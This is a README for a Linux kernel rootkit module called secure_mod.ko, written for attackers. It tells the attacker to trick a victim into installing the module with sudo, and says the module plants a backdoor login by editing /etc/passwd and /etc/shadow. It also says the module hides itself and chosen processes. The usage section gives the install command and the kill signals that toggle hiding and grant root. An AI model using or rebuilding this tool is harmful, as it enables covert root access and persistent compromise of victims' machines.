#Linux Rootkit
###Attacker should first trap victim into installing the rootkit by "sudo insmod secure_mod.ko". After that, the rootkit will add a backdoor for attacker by insert a line in both /etc/passwd and /etc/shadow. Then the attacker could login to victim's linux machine and get root priviledge to do some evil things. The rootkit will also hide itself and can hide a process by its pid.
#Usage
- <h3>Install</h3>
```
sudo insmod secure_mod.ko
```

- <h3>Hide/Unhide a Process</h3>
```
kill -62 pid
```

- <h3>Hide/Unhide rootkit</h3>
```
kill -63 0
```
- <h3>Get Root Priviledge</h3>
```
kill -64 0
```
- <h3>Uninstall</h3>
<h4>First unhide the rootkit by signal 63 then remove it by
```
sudo rmmod secure_mod
```